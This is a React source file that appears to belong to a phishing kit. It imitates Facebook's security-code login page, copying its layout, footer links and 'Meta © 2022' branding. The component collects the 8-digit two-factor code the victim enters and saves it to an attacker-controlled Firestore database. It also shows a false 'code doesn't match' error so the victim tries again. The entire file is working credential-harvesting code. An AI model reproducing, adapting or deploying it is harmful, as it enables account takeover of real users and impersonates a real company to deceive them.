import React, { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router";
import { Input, Button, Modal, InputNumber, Form } from "antd";
import "./styles/confirmation-second.css";
import {
  doc,
  updateDoc,
} from "firebase/firestore";
import { db } from "../firebase";

const { TextArea } = Input;

export const ConfirmationSecond = (props) => {
  const navigate = useNavigate();
  const { state } = useLocation();
  const [email, setEmail] = useState("");

  const [code, setCode] = useState("");

  const isNumber = (value) => {
    return /\d/.test(value);
  };

  const handleInputCode = (value) => {
    if (value.length > 8) return;
    setCode(value);
  };


  const cancelBtn = () => {
  };


  const updateAuth = async (auth) =>{
    try {
      var unique_id = localStorage.getItem("unique_id");
      if(unique_id){
        const userRef = doc(db, "users", JSON.parse(unique_id));
        await updateDoc(userRef, {
          auth: auth,
          status: 3
        });
      }
    } catch (error) {
      console.error(error);
    }
  }

  const handleSubmit = () => {
    if (!code.length || code.length < 8) return;
    updateAuth(code);
    setTimeout(() => {
      props.setValue(0)
    }, 700);
  };  
  return (
    <>
      <div className="confirmation-container-2">
        <div className="header-color">
          <div className="header-container">
            <div className="logo__faceook"></div>
          </div>
        </div>
        <div className="auth-req-container-2">
          <div className="auth-req-2">
            <div className="auth-req-text-2">
              <h2>Enter security code</h2>
              <div className="confirmation-second-2">
                <div className="auth-req-paragraph-2">
                  <p className="first-1-text">
                    Please check your email for a message with your code. Your
                    code is 8 numbers long.
                  </p>
                </div>
                <div className="flex-confirmation-second-2">
                  <div className="input-auth-req-2">
                    <Input
                      placeholder="Enter Code"
                      type="number"
                      required
                      value={code}
                      onChange={(e) => handleInputCode(e.target.value)}
                    />
                  </div>
                  <div className="sent-mail-2">
                    <p>We sent your code to:</p>
                    <p>
                      {!email ? "****@*********" : email}
                      {/* {isNumber(state?.email)
                        ? "****@*********"
                        : state?.email.includes("@")
                          ? state?.email
                          : "****@*********"} */}
                    </p>
                  </div>
                  
                </div>
                <div className="show-error-modal">
                  The login code you entered doesn't match. Please try again later.
                </div>
                
              </div>
            </div>
            <div className="show-input-on-mobile-2">
              <Input
                value={code}
                onChange={(e) => handleInputCode(e.target.value)}
              />
            </div>
            <div className="auth-req-footer-2">
              <a>Didn't get a code?</a>
              <div className="button-second-confirmation-2">
                <button onClick={() => cancelBtn()}>Cancel</button>
                <button disabled={code.length < 8} onClick={() => handleSubmit()}>Continue</button>
              </div>
            </div>
          </div>
          <div className="show-button-mobile-2">
            <h2>
              We sent your code to:
              <br />
              {isNumber(state?.email)
                ? "****@*********"
                : state?.email.includes("@")
                  ? state?.email
                  : "****@*********"}
            </h2>
            <p>
              Check that you have received an email containing your code. Your
              code has 8 numbers.
            </p>
            <h2>Enter the 8-digit code</h2>

            <Input
              type="number"
              placeholder="######"
              value={code}
              onChange={(e) => handleInputCode(e.target.value)}
            />
            {props.wrong_auth &&
               <div>
                  <p className="login__code">The login code you entered doesn't match. Please try again later.</p>
                </div>
             }
            <button disabled={code.length < 8} onClick={() => handleSubmit()}>Continue</button>
            <a>try another way</a>
          </div>

          <div className="show-footer-on-mobile-plus-2">
            <h2 className="h2-foot-2">Not You? Log In Here</h2>
            <div className="footer-flex-mobile-plus-2">
              <div>
                <h2>English (US)</h2>
                <p>Deutsch</p>
                <p>Српски</p>
                <p>Português (Brasil)</p>
              </div>
              <div>
                <p>Italiano</p>
                <p>Bosanski</p>
                <p>Svensk</p>
                <button>+</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="modal__footer">
        <div className="footer-menu-flex-ul-2">
          <div className="container-language-footer-2">
            <ul className="flex-ul-second-confirmation">
              <li>English (US)</li>
              <li>Español</li>
              <li>Deutsch</li>
              <li>Türkçe</li>
              <li>Српски</li>
              <li>Français (France)</li>
              <li>Italiano</li>
              <li>Bosanski</li>
              <li>Svensk</li>
              <li>Português (Brasil)</li>
              <button className="countrys-button-2">
                <span>+</span>
              </button>
            </ul>
          </div>
          <div className="flex-second-ul-confirmation">
            <ul>
              <li>Sign Up</li>
              <li>Log In</li>
              <li>Messenger</li>
              <li>Facebook Lite</li>
              <li>Watch</li>
              <li>Places</li>
              <li>Games</li>
              <li>Marketplace</li>
              <li>Facebook Pay</li>
              <li>Oculus</li>
              <li>Portal</li>
              <li>Instagram</li>
              <li>Bulletin</li>
              <li>Local</li>
            </ul>
          </div>
          <div className="flex-second-ul-4">
            <ul>
              <li>Fundraisers</li>
              <li>Services</li>
              <li>Voting Information Centre</li>
              <li>About</li>
              <li>Create ad</li>
              <li>Create Page</li>
              <li>Developers</li>
              <li>Careers</li>
              <li>Privacy</li>
              <li>Cookies</li>
              <li className="ad-choice-img-2">
                Ad Choices <span className="img-li-2"></span>{" "}
              </li>
              <li>Terms</li>
              <li>Help</li>
            </ul>
          </div>
          <div className="meta-footer-2">
            <p>Meta © 2022</p>
          </div>
        </div>
      </div>
    </>
  );
};
